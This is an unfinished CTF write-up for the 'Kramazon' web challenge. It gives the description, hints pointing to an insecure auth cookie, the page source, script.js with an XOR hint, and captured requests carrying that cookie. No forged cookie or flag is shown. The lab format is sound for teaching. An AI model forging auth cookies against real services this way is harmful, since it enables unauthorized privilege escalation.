
# Kramazon

## Description

Intelligence analysts from the North Pole Logistics Directorate (NPLD) have uncovered a covert online storefront operated by the KRAMPUS Syndicate. Its name? **Kramazon.**

Looks familiar. Works familiar. Absolutely not legitimate.

Kramazon is a distribution front used by the Syndicate to intercept gifts, reroute sleigh cargo, and quietly undermine Santa’s global delivery network.

NPLD Cyber Response believes Kramazon’s checkout system contains a subtle implementation flaw: customers with ordinary elf-level accounts have somehow been able to receive Santa-priority shipping status, which should only be assigned through Santa’s authenticated sleigh-routing systems.

If KRAMPUS operators are abusing this flaw, they could divert or prioritize packages in ways that delay, disrupt, or even sabotage the entire Christmas Eve operation.

Investigate Kramazon’s ordering workflow. If you can exploit this flaw to obtain Santa Priority Delivery for your order, Kramazon will reveal its restricted Priority Route Manifest, which contains the flag.

Good luck, Operative.

[https://kramazon.csd.lol/](https://kramazon.csd.lol/)

---

_**You are only allowed to test in the scope `https://kramazon.csd.lol/*`.** Blind brute-force request sending (e.g. using tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore, if you wish to brute-force, please limit your wordlists or attack scope._


## Hints

#### 1
The challenge description states that regular users were able to somehow identify as the privileged Santa user. Use your browser DevTools and carefully review all requests and responses in the "Network" tab to see if anything is relevant. Additionally, reading over the `script.js` file that is being run will also be helpful.

Remember, an HTTP response includes more than just the body.

### 2
There is a [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) header being sent when you request the homepage. Perhaps the server is [not verifying](https://www.geeksforgeeks.org/ethical-hacking/insecure-direct-object-reference-idor-vulnerability/) this part of the authentication flow properly.
Using any clues that you can find in `script.js` (do any parts of the code look off?), can you reverse engineer the cookie and send one that can exploit the challenge?

# Solve

## d1
```
view-source:https://kramazon.csd.lol/
<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>IDOR</title> <script src="[https://cdn.tailwindcss.com](view-source:https://cdn.tailwindcss.com/)"></script> <link rel="stylesheet" href="[https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css](view-source:https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css)" /> <link rel="stylesheet" href="[styles.css](view-source:https://kramazon.csd.lol/styles.css)" /> </head> <body class="bg-gray-100"> <!-- Header Section --> <header> <!-- Top Navigation --> <div class="flex items-center bg-[#131921] text-white p-1"> <!-- Logo --> <div class="flex items-center p-1 pr-2 nav-link-border"> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="font-bold text-lg mx-2"> <img class="h-12 w-auto mt-2" src="[/kramazon-pls-no-dmca.png](view-source:https://kramazon.csd.lol/kramazon-pls-no-dmca.png)" alt="Kramazon Logo" /> </a> </div> <!-- Deliver to --> <div class="hidden md:flex items-center p-2 nav-link-border"> <i class="fas fa-map-marker-alt mr-1"></i> <div> <p class="text-xs text-gray-300">Deliver to</p> <p class="text-sm font-bold" id="location"></p> </div> </div> <!-- Search Bar with AI icon --> <div class="flex-grow flex items-center mx-2 search-focus rounded-lg"> <div class="bg-gray-200 text-gray-700 text-xs p-3 rounded-l-md hover:bg-gray-300 cursor-pointer h-10 flex items-center justify-center" > <span>All</span> <i class="fas fa-caret-down ml-1"></i> </div> <input class="w-full h-10 p-2 text-black text-base outline-none" type="text" placeholder="Search kramazon.csd.lol" /> <div class="bg-gray-200 p-3 h-10 flex items-center justify-center"> <i class="fa-solid fa-wand-magic-sparkles text-orange-500"></i> </div> <div class="bg-[#FEBD69] hover:bg-[#F3A847] p-3 rounded-r-md cursor-pointer h-10 flex items-center justify-center" > <i class="fas fa-search text-black"></i> </div> </div> </div> <!-- Bottom Navigation --> <div class="flex items-center bg-[#232F3E] text-white text-sm p-2 space-x-4"> <!-- YOU SAID NOT TO CHANGE THESE --> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="flex items-center font-bold p-1 nav-link-border"><i class="fas fa-bars mr-1"></i> All</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="p-1 nav-link-border">Sleighjacking Services</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="p-1 nav-link-border">Coal-as-a-Service (CaaS™)</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="p-1 nav-link-border">Holiday Phishing Kit</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="p-1 nav-link-border">Gift Decryption Tools</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="hidden md:inline-block p-1 nav-link-border">Elf Relocation Program</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="hidden md:inline-block p-1 nav-link-border">Naughty List Editing & Data Removal</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="hidden lg:inline-block p-1 nav-link-border">Anti-Caroler Countermeasures</a> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="hidden lg:inline-block p-1 nav-link-border">Krampus Customer Support</a> </div> </header> <!-- Main Content --> <main class="max-w-screen-2xl mx-auto"> <!-- Hero Section --> <!-- <section class="relative"> <div class="slider-container h-[250px] sm:h-[400px] lg:h-[600px]"> <div class="slide active"> <img src="https://images-eu.ssl-images-amazon.com/images/G/31/IN/Prime/GIF/25/Jupiter_Early-Deals_8sep_PC_hero_1x._CB800480062_.jpg" alt="KRAMPUS Early Deals Event — Unauthorized Inventory Liquidation" /> </div> <div class="slide"> <img src="https://images-eu.ssl-images-amazon.com/images/G/31/CookwareDining/Jupiter25/GW/KSD/RV/RV1/KDRV3000x1200._CB800539012_.png" alt="Elf-Liberated Kitchenware — 80% Off" /> </div> <div class="slide"> <img src="https://images-eu.ssl-images-amazon.com/images/G/31/img24/Wireless/Madhav/Jupiter25/Apple/PC_PB_Leadup_Lifestyle_CS._CB800749216_.jpg" alt="Black Ice Phone Deals — Smuggled Tech Clearance" /> </div> <button class="slider-btn prev" id="prevBtn"><i class="fa-solid fa-chevron-left"></i></button> <button class="slider-btn next" id="nextBtn"><i class="fa-solid fa-chevron-right"></i></button> </div> <div class="absolute inset-x-0 bottom-0 h-32 sm:h-64 bg-gradient-to-t from-gray-100 to-transparent"></div> </section> --> <!-- Product Grid --> <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 p-6 relative z-10"> <!-- Card 1 --> <div class="bg-white p-4 rounded-md shadow-md overflow-hidden"> <h2 class="text-xl font-bold mb-2">Unlock the Darkest Deals of Kramazon</h2> <!-- UPDATED --> <img src="[/krime-loyalty-program.png](view-source:https://kramazon.csd.lol/krime-loyalty-program.png)" class="w-full h-auto object-cover rounded-md" /> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="mt-4 inline-block">Join Krime™ Loyalty Program</a> <!-- UPDATED --> </div> <!-- Card 2 --> <div class="bg-white p-4 rounded-md shadow-md overflow-hidden"> <h2 class="text-xl font-bold mb-2">Up to 60% Off | Disguises for Seasonal Ops</h2> <!-- UPDATED --> <div class="grid grid-cols-2 gap-4"> <div> <img src="[https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF1-186-116._SY116_CB636048992_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF1-186-116._SY116_CB636048992_.jpg)" class="h-24 w-full object-cover" /> <p class="text-xs mt-1">Operational Cloaks</p> <!-- UPDATED --> </div> <div> <img src="[https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF2-186-116._SY116_CB636048992_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF2-186-116._SY116_CB636048992_.jpg)" class="h-24 w-full object-cover" /> <p class="text-xs mt-1">Encrypted Carry Bags</p> <!-- UPDATED --> </div> <div> <img src="[https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF4-186-116._SY116_CB636048992_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF4-186-116._SY116_CB636048992_.jpg)" class="h-24 w-full object-cover" /> <p class="text-xs mt-1">Time-Sync Wrist Modules</p> <!-- UPDATED --> </div> <div> <img src="[https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF3-186-116._SY116_CB636048992_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/G/31/img22/Fashion/Gateway/BAU/BTF-Refresh/May/PC_WF/WF3-186-116._SY116_CB636048992_.jpg)" class="h-24 w-full object-cover" /> <p class="text-xs mt-1">Obfuscated Identity Trinkets</p> <!-- UPDATED --> </div> </div> <a href="[#](view-source:https://kramazon.csd.lol/#)" class="mt-4 inline-block">View All Covert Wardrobe Kits</a> <!-- UPDATED --> </div> <!-- Card 3 --> <div class="bg-white p-4 rounded-md shadow-md overflow-hidden"> <h2 class="text-xl font-bold mb-2">Order Your Zero-Day Advent Calendar™</h2> <!-- UPDATED --> <img src="[/advent-calendar.png](view-source:https://kramazon.csd.lol/advent-calendar.png)" class="w-full h-auto object-cover rounded-md" /> <button id="order" class="bg-gray-800 hover:bg-gray-900 w-full text-white p-2 rounded-lg mt-4 font-semibold"> Order Now </button> <!-- UPDATED --> </div> <!-- Sign In --> <div class="flex flex-col space-y-4"> <div class="bg-white p-4 rounded-md shadow-md text-center"> <h2 class="text-xl font-bold">Log In for Personalized Krampus Intelligence</h2> <!-- UPDATED --> <button class="bg-yellow-400 hover:bg-yellow-500 w-full p-2 rounded-lg mt-4 font-semibold"> Coming Soon </button> </div> </div> </section> <!-- Today's Deals --> <section class="bg-white p-6 m-6 rounded-md shadow-md"> <h2 class="text-xl font-bold mb-2"> Black-Market Flash Deals <a href="[#](view-source:https://kramazon.csd.lol/#)" class="text-sm ml-4">See all deals</a> </h2> <div class="flex items-center overflow-x-auto product-carousel pb-4"> <div class="flex space-x-6"> <div class="flex-shrink-0 w-48 text-left"> <div class="bg-gray-100 p-4 rounded-md"> <img src="[https://m.media-amazon.com/images/I/71nUHQam5RL._AC_UY218_.jpg](view-source:https://m.media-amazon.com/images/I/71nUHQam5RL._AC_UY218_.jpg)" class="h-32 mx-auto" /> </div> <p class="mt-2 text-sm truncate">Top Seller in Compromised Devices</p> <!-- UPDATED --> <p class="text-red-600 font-bold mt-1 text-sm bg-red-100 px-2 py-1 rounded inline-block">Up to 45% off</p> </div> <div class="flex-shrink-0 w-48 text-left"> <div class="bg-gray-100 p-4 rounded-md"> <img src="[https://m.media-amazon.com/images/I/315vs3rLEZL._AC_SY200_.jpg](view-source:https://m.media-amazon.com/images/I/315vs3rLEZL._AC_SY200_.jpg)" class="h-32 mx-auto" /> </div> <p class="mt-2 text-sm truncate">HP FrostByte 15s — NPLD Leak Edition</p> <!-- UPDATED --> <p class="text-red-600 font-bold mt-1 text-sm bg-red-100 px-2 py-1 rounded inline-block"> Deal of the Day </p> </div> <div class="flex-shrink-0 w-48 text-left"> <div class="bg-gray-100 p-4 rounded-md"> <img src="[https://m.media-amazon.com/images/I/616wnQmPQ-L._AC_UY218_.jpg](view-source:https://m.media-amazon.com/images/I/616wnQmPQ-L._AC_UY218_.jpg)" class="h-32 mx-auto" /> </div> <p class="mt-2 text-sm truncate">OnePlus NORDIC-4 5G (North Pole Edition)</p> <!-- UPDATED --> <p class="text-red-600 font-bold mt-1 text-sm bg-red-100 px-2 py-1 rounded inline-block"> Save up to 10% </p> </div> <div class="flex-shrink-0 w-48 text-left"> <div class="bg-gray-100 p-4 rounded-md"> <img src="[https://m.media-amazon.com/images/I/61-XNG5lPBL._AC_UY218_.jpg](view-source:https://m.media-amazon.com/images/I/61-XNG5lPBL._AC_UY218_.jpg)" class="h-32 mx-auto" /> </div> <p class="mt-2 text-sm truncate">Intercept-Grade Audio Gear (Syndicate Series)</p> <!-- UPDATED --> <p class="text-red-600 font-bold mt-1 text-sm bg-red-100 px-2 py-1 rounded inline-block">Up to 75% off</p> </div> <div class="flex-shrink-0 w-48 text-left"> <div class="bg-gray-100 p-4 rounded-md"> <img src="[https://m.media-amazon.com/images/I/61Z-M7aDd2L._AC_UL320_.jpg](view-source:https://m.media-amazon.com/images/I/61Z-M7aDd2L._AC_UL320_.jpg)" class="h-32 mx-auto" /> </div> <p class="mt-2 text-sm truncate">Extraction Suitcases & Tactical Bags</p> <!-- UPDATED --> <p class="text-red-600 font-bold mt-1 text-sm bg-red-100 px-2 py-1 rounded inline-block">Min. 70% off</p> </div> <div class="flex-shrink-0 w-48 text-left"> <div class="bg-gray-100 p-4 rounded-md"> <img src="[https://m.media-amazon.com/images/I/71UnjM6ErlL._AC_UL320_.jpg](view-source:https://m.media-amazon.com/images/I/71UnjM6ErlL._AC_UL320_.jpg)" class="h-32 mx-auto" /> </div> <p class="mt-2 text-sm truncate">Operational Apparel — Starting at $1.99</p> <!-- UPDATED --> </div> </div> </div> </section> <!-- Sustainable Finds --> <section class="bg-white p-6 m-6 rounded-md shadow-md"> <h2 class="text-xl font-bold mb-2">Ethically Sourced (Stolen) Inventory</h2> <!-- UPDATED --> <div class="flex items-center overflow-x-auto product-carousel pb-4"> <div class="flex space-x-6"> <!-- images unchanged --> <div class="flex-shrink-0 w-40"> <img src="[https://images-eu.ssl-images-amazon.com/images/I/31E4WCkI6tL._AC_UL165_SR165,165_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/I/31E4WCkI6tL._AC_UL165_SR165,165_.jpg)" /> </div> <div class="flex-shrink-0 w-40"> <img src="[https://images-eu.ssl-images-amazon.com/images/I/71Ddd8BsFjL._AC_UL165_SR165,165_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/I/71Ddd8BsFjL._AC_UL165_SR165,165_.jpg)" /> </div> <div class="flex-shrink-0 w-40"> <img src="[https://m.media-amazon.com/images/I/71DiuntB4aL._AC_SY200_.jpg](view-source:https://m.media-amazon.com/images/I/71DiuntB4aL._AC_SY200_.jpg)" /> </div> <div class="flex-shrink-0 w-40"> <img src="[https://images-eu.ssl-images-amazon.com/images/I/71k6eOu04uL._AC_UL165_SR165,165_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/I/71k6eOu04uL._AC_UL165_SR165,165_.jpg)" /> </div> <div class="flex-shrink-0 w-40"> <img src="[https://m.media-amazon.com/images/I/61qJt25FguL._AC_UL165_SR165,165_.jpg](view-source:https://m.media-amazon.com/images/I/61qJt25FguL._AC_UL165_SR165,165_.jpg)" /> </div> <div class="flex-shrink-0 w-40"> <img src="[https://images-eu.ssl-images-amazon.com/images/I/61iMtujTnBL._AC_UL165_SR165,165_.jpg](view-source:https://images-eu.ssl-images-amazon.com/images/I/61iMtujTnBL._AC_UL165_SR165,165_.jpg)" /> </div> </div> </div> </section> <!-- Electronics Hub --> <section class="bg-white p-6 m-6 rounded-md shadow-md"> <h2 class="text-xl font-bold mb-2">Up to 70% Off | Krampus Cyber Division Clearance</h2> <!-- UPDATED --> <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4"> <div class="flex-shrink-0"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/61dD-ZZV-nL._AC_UL200_.jpg](view-source:https://m.media-amazon.com/images/I/61dD-ZZV-nL._AC_UL200_.jpg)" /></a> </div> <div class="flex-shrink-0"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/31VjlrbE3bL._AC_SY200_.jpg](view-source:https://m.media-amazon.com/images/I/31VjlrbE3bL._AC_SY200_.jpg)" /></a> </div> <div class="flex-shrink-0"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/61qlK8MUyiL._AC_UL200_.jpg](view-source:https://m.media-amazon.com/images/I/61qlK8MUyiL._AC_UL200_.jpg)" /></a> </div> <div class="flex-shrink-0"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/71CxgCKczdL._AC_UL200_.jpg](view-source:https://m.media-amazon.com/images/I/71CxgCKczdL._AC_UL200_.jpg)" /></a> </div> </div> </section> <!-- Inspired by browsing --> <section class="bg-white p-6 m-6 rounded-md shadow-md"> <h2 class="text-xl font-bold mb-2">Recommended Tools for Your Next Operation</h2> <!-- UPDATED --> <div class="flex items-center overflow-x-auto product-carousel pb-4"> <div class="flex space-x-6"> <!-- PRODUCT 1 --> <div class="flex-shrink-0 w-48 text-left"> <a href="[#](view-source:https://kramazon.csd.lol/#)" ><img src="[https://m.media-amazon.com/images/I/716CRTrQzgL._AC_UY320_.jpg](view-source:https://m.media-amazon.com/images/I/716CRTrQzgL._AC_UY320_.jpg)" class="h-40 mx-auto" /></a> <p class="mt-2 text-sm">Sleigh-Silent EarComms 141</p> <!-- UPDATED --> <p class="text-yellow-500 mt-1">★★★★☆ <span class="text-gray-600">(1,234)</span></p> <p class="font-bold">₹1,299.00</p> </div> <!-- PRODUCT 2 --> <div class="flex-shrink-0 w-48 text-left"> <a href="[#](view-source:https://kramazon.csd.lol/#)" ><img src="[https://m.media-amazon.com/images/I/719C6bJv8jL._AC_UL320_.jpg](view-source:https://m.media-amazon.com/images/I/719C6bJv8jL._AC_UL320_.jpg)" class="h-40 mx-auto" /></a> <p class="mt-2 text-sm">Lenovo IcePad Slim 3</p> <!-- UPDATED --> <p class="text-yellow-500 mt-1">★★★★☆ <span class="text-gray-600">(456)</span></p> <p class="font-bold">₹38,990.00</p> </div> <!-- PRODUCT 3 --> <div class="flex-shrink-0 w-48 text-left"> <a href="[#](view-source:https://kramazon.csd.lol/#)" ><img src="[https://m.media-amazon.com/images/I/61amb0CfMGL._AC_UY320_.jpg](view-source:https://m.media-amazon.com/images/I/61amb0CfMGL._AC_UY320_.jpg)" class="h-40 mx-auto" /></a> <p class="mt-2 text-sm">OnePlus 11R — Rudolph Edition</p> <!-- UPDATED --> <p class="text-yellow-500 mt-1">★★★★★ <span class="text-gray-600">(8,910)</span></p> <p class="font-bold">₹39,999.00</p> </div> <!-- PRODUCT 4 --> <div class="flex-shrink-0 w-48 text-left"> <a href="[#](view-source:https://kramazon.csd.lol/#)" ><img src="[https://m.media-amazon.com/images/I/51Y5q+QPCRL._AC_UY320_.jpg](view-source:https://m.media-amazon.com/images/I/51Y5q+QPCRL._AC_UY320_.jpg)" class="h-40 mx-auto" /></a> <p class="mt-2 text-sm">The Psychology of Naughty-List Exploits</p> <!-- UPDATED --> <p class="text-yellow-500 mt-1">★★★★★ <span class="text-gray-600">(50,321)</span></p> <p class="font-bold">₹350.00</p> </div> <!-- PRODUCT 5 --> <div class="flex-shrink-0 w-48 text-left"> <a href="[#](view-source:https://kramazon.csd.lol/#)" ><img src="[https://m.media-amazon.com/images/I/71oXoIMlfTL._AC_UY320_.jpg](view-source:https://m.media-amazon.com/images/I/71oXoIMlfTL._AC_UY320_.jpg)" class="h-40 mx-auto" /></a> <p class="mt-2 text-sm">MI 4K Surveillance Monitor</p> <!-- UPDATED --> <p class="text-yellow-500 mt-1">★★★★☆ <span class="text-gray-600">(3,210)</span></p> <p class="font-bold">₹29,999.00</p> </div> <!-- PRODUCT 6 --> <div class="flex-shrink-0 w-48 text-left"> <a href="[#](view-source:https://kramazon.csd.lol/#)" ><img src="[https://m.media-amazon.com/images/I/71162EQnpKL._AC_UY320_.jpg](view-source:https://m.media-amazon.com/images/I/71162EQnpKL._AC_UY320_.jpg)" class="h-40 mx-auto" /></a> <p class="mt-2 text-sm">Galaxy Watch 6 (Elf-Tracking Firmware)</p> <!-- UPDATED --> <p class="text-yellow-500 mt-1">★★★★☆ <span class="text-gray-600">(6,789)</span></p> <p class="font-bold">₹14,990.00</p> </div> </div> </div> </section> <!-- Books --> <section class="bg-white p-6 m-6 rounded-md shadow-md"> <h2 class="text-xl font-bold mb-2">Top Classified Reads in the Syndicate Archives</h2> <!-- UPDATED --> <div class="flex items-center overflow-x-auto product-carousel pb-4"> <div class="flex space-x-4"> <!-- images unchanged --> <div class="flex-shrink-0 w-36"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/71sBtM3Yi5L._AC_SY200_.jpg](view-source:https://m.media-amazon.com/images/I/71sBtM3Yi5L._AC_SY200_.jpg)" /></a> </div> <div class="flex-shrink-0 w-36"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/81BE7eeKzAL._AC_SY200_.jpg](view-source:https://m.media-amazon.com/images/I/81BE7eeKzAL._AC_SY200_.jpg)" /></a> </div> <div class="flex-shrink-0 w-36"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/715qi-cIbML._AC_UY200_.jpg](view-source:https://m.media-amazon.com/images/I/715qi-cIbML._AC_UY200_.jpg)" /></a> </div> <div class="flex-shrink-0 w-36"> <a href="[#](view-source:https://kramazon.csd.lol/#)"><img src="[https://m.media-amazon.com/images/I/81l3rZK4lnL._AC_UY200_.jpg](view-source:https://m.media-amazon.com/images/I/81l3rZK4lnL._AC_UY200_.jpg)" /></a> </div> </div> </div> </section> </main> <!-- Footer Section --> <footer> <div class="border-t border-gray-300 py-6 my-6"> <div class="text-center"> <p class="text-sm">See personalized recommendations</p> <button class="bg-yellow-400 hover:bg-yellow-500 w-64 p-2 rounded-lg my-2 font-semibold text-sm"> Sign in </button> <p class="text-xs">New customer? <a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Start here.</a></p> </div> </div> <div class="text-center p-4 bg-[#37475A] hover:bg-[#4A5C70] cursor-pointer" id="backToTopBtn"> <p class="text-white text-sm">Back to top</p> </div> <div class="bg-[#232F3E] text-white"> <div class="max-w-screen-xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-8 px-4 py-10"> <div> <h3 class="font-bold mb-2">Get to Know Us</h3> <ul class="text-sm space-y-2 text-gray-300"> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">About Us</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Careers</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Press Releases</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Amazon Science</a></li> </ul> </div> <div> <h3 class="font-bold mb-2">Connect with Us</h3> <ul class="text-sm space-y-2 text-gray-300"> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Facebook</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Twitter</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Instagram</a></li> </ul> </div> <div> <h3 class="font-bold mb-2">Make Money with Us</h3> <ul class="text-sm space-y-2 text-gray-300"> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Sell on Amazon</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Sell under Amazon Accelerator</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Become an Affiliate</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Advertise Your Products</a></li> </ul> </div> <div> <h3 class="font-bold mb-2">Let Us Help You</h3> <ul class="text-sm space-y-2 text-gray-300"> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">COVID-19 and Amazon</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Your Account</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Returns Centre</a></li> <li><a href="[#](view-source:https://kramazon.csd.lol/#)" class="">Help</a></li> </ul> </div> </div> </div> <div class="bg-[#131921] text-gray-300 text-xs py-6"> <div class="max-w-screen-xl mx-auto text-center"> <img class="h-6 w-auto mx-auto mb-4" src="[/kramazon-pls-no-dmca.png](view-source:https://kramazon.csd.lol/kramazon-pls-no-dmca.png)" alt="Amazon Logo" /> <p>© 2025 Kramazon, Inc.</p> </div> </div> </footer> <script src="[script.js](view-source:https://kramazon.csd.lol/script.js)"></script> <script defer src="[https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015](view-source:https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015)" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"7e878029e60c45878d4c9e57f121994b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script> </body> </html>
```

## d2
```
script.js
document.addEventListener("DOMContentLoaded", function () {
  // Hero Slider Logic
  const slides = document.querySelectorAll(".slide");
  const prevBtn = document.getElementById("prevBtn");
  const nextBtn = document.getElementById("nextBtn");
  let currentSlide = 0;
  let slideInterval;

  function showSlide(index) {
    slides.forEach((slide, i) => {
      slide.classList.remove("active");
      if (i === index) {
        slide.classList.add("active");
      }
    });
  }

  function nextSlide() {
    currentSlide = (currentSlide + 1) % slides.length;
    showSlide(currentSlide);
  }

  function prevSlide() {
    currentSlide = (currentSlide - 1 + slides.length) % slides.length;
    showSlide(currentSlide);
  }

  function startSlideShow() {
    slideInterval = setInterval(nextSlide, 5000); // Change slide every 5 seconds
  }

  function stopSlideShow() {
    clearInterval(slideInterval);
  }

  nextBtn.addEventListener("click", () => {
    nextSlide();
    stopSlideShow();
    startSlideShow();
  });

  prevBtn.addEventListener("click", () => {
    prevSlide();
    stopSlideShow();
    startSlideShow();
  });

  showSlide(currentSlide);
  startSlideShow();

  // Back to Top button
  const backToTopBtn = document.getElementById("backToTopBtn");
  backToTopBtn.addEventListener("click", () => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  });
});

// :)
(async () => {
  const response = await fetch("https://ipapi.co/json/");
  const data = await response.json();

  const locationElement = document.getElementById("location");

  locationElement.textContent = `${data.city}, ${data.postal}`;
})();

document.getElementById("order").addEventListener("click", async () => {
  try {
    console.log("Creating order...");

    const createRes = await fetch("/create-order", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });
    const order = await createRes.json();

    console.log("[*] Waiting for status callback...");
    setTimeout(async () => {
      const callbackRes = await fetch(order.callback_url);
      const status = await callbackRes.json();

      function santaMagic(n) {
        return n ^ 0x37; // TODO: remove in production
      }

      if (status.internal.user === 1) {
        alert("Welcome, Santa! Allowing priority finalize...");
      }

      setTimeout(async () => {
        const finalizeRes = await fetch("/finalize", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            user: status.internal.user,
            order: order.order_id,
          }),
        });

        const finalize = await finalizeRes.json();
        console.log("Finalize response:", finalize);

        alert("Order completed. Thank you for your support to Krampus Syndicate!");
      }, 1000);
    }, 3000);
  } catch (err) {
    console.error("Error in workflow:", err);
  }
});

```

## d3

```
POST /cdn-cgi/rum? HTTP/2
Host: kramazon.csd.lol
Cookie: auth=BA4FBg%3D%3D
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1058
Origin: https://kramazon.csd.lol
Referer: https://kramazon.csd.lol/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"memory":{},"resources":[],"referrer":"","eventType":1,"firstPaint":0,"firstContentfulPaint":535,"startTime":1765121108803,"versions":{"fl":"2024.11.0","js":"2024.6.1","timings":2},"pageloadId":"e39efcf5-c927-41c5-95b8-ee0942ad7741","location":"https://kramazon.csd.lol/","nt":"reload","timingsV2":{"unloadEventStart":420,"unloadEventEnd":421,"domInteractive":536,"domContentLoadedEventStart":538,"domContentLoadedEventEnd":538,"domComplete":539,"loadEventStart":539,"loadEventEnd":539,"type":"reload","redirectCount":0,"initiatorType":"navigation","nextHopProtocol":"h2","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1,"domainLookupStart":36,"domainLookupEnd":36,"connectStart":36,"connectEnd":37,"secureConnectionStart":37,"requestStart":39,"responseStart":49,"responseEnd":391,"transferSize":22112,"encodedBodySize":21812,"decodedBodySize":21812,"responseStatus":200,"contentType":"text/html","name":"https://kramazon.csd.lol/","entryType":"navigation","startTime":0,"duration":539},"siteToken":"7e878029e60c45878d4c9e57f121994b","st":2}

HTTP/2 204 No Content
Date: Sun, 07 Dec 2025 15:25:09 GMT
Content-Type: text/plain
Access-Control-Allow-Origin: https://kramazon.csd.lol
Access-Control-Allow-Methods: POST,OPTIONS
Access-Control-Max-Age: 86400
Vary: Origin, accept-encoding
Access-Control-Allow-Credentials: true
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=NdR5CtjrySMAErTMz6d6Kf9zVZSQ9uMgEIlJ9KwaLhCbfTxOdXBE0D355f862m2j0cqsinQffQCOAWI9A77sZLMYEk8LJTM7Mza6AmFnSaY%3D"}]}
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
Server: cloudflare
Cf-Ray: 9aa508b64a301b45-LAX
Alt-Svc: h3=":443"; ma=86400


```

## d4
```
GET / HTTP/2
Host: kramazon.csd.lol
Cookie: auth=BA4FBg%3D%3D
